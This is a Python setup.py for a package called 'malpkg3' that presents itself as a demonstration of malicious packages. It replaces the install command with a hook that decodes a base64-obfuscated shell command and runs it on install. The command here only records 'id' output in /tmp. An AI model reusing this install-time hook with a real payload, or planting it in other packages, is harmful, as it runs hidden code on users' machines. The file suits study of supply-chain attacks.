from setuptools.command.install import install 
import subprocess
import setuptools 
import base64
import json
import os 

# malicious code in install hook
class PyInstall(install):
    # PAYLOAD: run command
    def run(self):
        cmd = base64.b64decode(b"ZWNobyAnTWFsUHl0aG9uIHBhY2thZ2UnID4gL3RtcC9yZXN1bHQudHh0OyBpZCA+PiAvdG1wcmVzdWx0LnR4dAo=")
        res = subprocess.Popen (
            cmd, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT
        ).stdout.read().decode()

        # continue the flow
        install.run(self)


setuptools.setup(
    name="malpkg3",
    version="0.1.0",
    author="Satria Ady Pradana",
    description="Simple package to demonstrate malicious package",
    packages=setuptools.find_packages(),
    cmdclass={
        "install": PyInstall,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    project_urls={
        "Repository": "https://github.com/xathrya/malpython",
    },
    python_requires=">=3.6",
)